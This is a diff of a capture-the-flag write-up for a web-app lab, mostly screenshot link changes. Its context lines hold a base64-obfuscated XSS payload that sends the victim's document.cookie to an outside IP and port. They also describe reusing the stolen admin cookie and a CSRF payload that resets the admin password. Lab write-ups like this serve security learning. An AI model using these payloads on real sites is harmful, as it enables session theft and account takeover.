@@ -36,7 +36,6 @@ It also also found that 'moderator' is an existing username. So I proceed to use
 - Then diffenerent encoding methods were tried and base64 worked. The new payload was `<img src=x onerror="eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vMTAuMTEuMTM5LjE4NDo0NDQ1Lz89Jytkb2N1bWVudC5jb29raWU7'))">`
 - <img width="1910" height="967" alt="Screenshot from 2025-09-29 21-36-32" src="https://github.com/user-attachments/assets/25a13d56-f6d1-4890-b589-2bd62751f658" />
 - It worked and admin flag retrieved - logout, and log back in by copied & pasted the new admin cookie to the login page.
-- <img width="1910" height="967" alt="image" src="https://github.com/user-attachments/assets/75d68e1d-fad7-4706-8a65-47108ead3a90" />
 
 ### Another way to get the flag
 - another way to get the flag could be having a paylaod to change the password directly - CSRF. Going back and login as the moderator and go to the chat.
@@ -77,7 +76,10 @@ It also also found that 'moderator' is an existing username. So I proceed to use
     </script>
   ```
 - finally, logout, and login again using username 'admin' and password 'test'. Got the same flag.
-- <img width="1599" height="833" alt="Screenshot from 2025-09-29 22-01-17" src="https://github.com/user-attachments/assets/c99d63e1-feb3-4aa2-994e-f52e93eabc1a" />
+<img width="1890" height="886" alt="image" src="https://github.com/user-attachments/assets/6891176c-b4fe-4585-b7d7-aa58143e27ce" />
+
+
+
 
 
 
